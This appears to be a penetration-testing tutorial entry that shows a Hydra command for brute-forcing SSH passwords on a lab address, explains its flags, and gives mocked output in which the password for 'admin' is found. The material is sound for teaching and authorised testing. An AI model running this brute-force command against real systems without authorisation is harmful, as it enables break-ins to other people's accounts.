# Hydra Examples

## Scenario: SSH Brute-Forcing

You have discovered an SSH service running on a target (192.168.1.20) and know there is a user named `admin`. You want to perform a dictionary attack to guess the password.

### Command

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.20 -t 4 -vV
```

### Explanation of Flags
* `-l admin`: Specifies a single login name (`admin`). (Use `-L` for a list of usernames).
* `-P ...`: Specifies the file containing the list of passwords to try.
* `ssh://192.168.1.20`: Specifies the protocol and target IP address.
* `-t 4`: Sets the number of parallel tasks to 4 (helps avoid overwhelming the service or triggering rate limits).
* `-vV`: Very verbose mode; shows login+pass combinations for each attempt.

### Mocked Terminal Output

```text
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-31 11:15:00
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586099 tries per task
[DATA] attacking ssh://192.168.1.20:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 192.168.1.20 - login "admin" - pass "123456" - 1 of 14344399 [child 0]
[ATTEMPT] target 192.168.1.20 - login "admin" - pass "password" - 2 of 14344399 [child 1]
[ATTEMPT] target 192.168.1.20 - login "admin" - pass "12345" - 3 of 14344399 [child 2]
[ATTEMPT] target 192.168.1.20 - login "admin" - pass "admin123" - 4 of 14344399 [child 3]
[22][ssh] host: 192.168.1.20   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-31 11:15:05
```
